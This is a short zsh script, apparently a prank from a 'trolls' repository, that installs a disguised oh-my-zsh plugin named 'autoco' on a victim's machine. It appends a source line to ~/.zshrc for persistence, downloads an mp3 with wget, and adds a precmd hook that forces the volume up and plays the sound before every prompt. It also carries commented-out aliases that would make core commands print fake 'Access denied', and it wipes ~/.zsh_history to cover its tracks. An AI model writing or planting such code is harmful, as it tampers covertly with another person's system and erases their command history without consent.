#!/bin/zsh
mkdir -p "$HOME/.oh-my-zsh/custom/plugins/autoco"
DIR="$HOME/.oh-my-zsh/custom/plugins/autoco"
echo -e "\nsource $DIR/autoco.plugin.zsh" >> "$HOME/.zshrc"
SOUND="$DIR/apoil.mp3"
if [ ! -e "$SOUND" ]; then
	wget -q -O "$SOUND" "https://raw.githubusercontent.com/kema-dev/trolls/main/shell_audio_42/apoil.mp3"
	chmod 655 "$SOUND"
fi

PLUG="precmd() { osascript -e 'set Volume 1' 2>&1 > /dev/null ; afplay $SOUND & }
# alias chmod='echo chmod: Access denied'
# alias vim='echo vim: Access denied'
# alias vi='echo vi: Access denied'
# alias ls='echo ls: Access denied'
# alias echo='echo echo: Access denied'
# alias cat='echo cat: Access denied'
# alias cp='echo cp: Access denied'
# alias mv='echo mv: Access denied'
# alias rm='echo rm: Access denied'
# alias mkdir='echo mkdir: Access denied'
# alias rmdir='echo rmdir: Access denied'
# alias grep='echo grep: Access denied'
# alias less='echo less: Access denied'
# alias more='echo more: Access denied'
# alias tail='echo tail: Access denied'
# alias head='echo head: Access denied'
# alias top='echo top: Access denied'
# alias ps='echo ps: Access denied'
# alias kill='echo kill: Access denied'
# alias killall='echo killall: Access denied'
# alias bash='echo bash: Access denied'
# alias code='echo code: Access denied'
# alias open='echo open: Access denied'
"

echo -n "$PLUG" > "$DIR/autoco.plugin.zsh"
chmod 655 "$DIR/autoco.plugin.zsh"
echo -n >| $HOME/.zsh_history
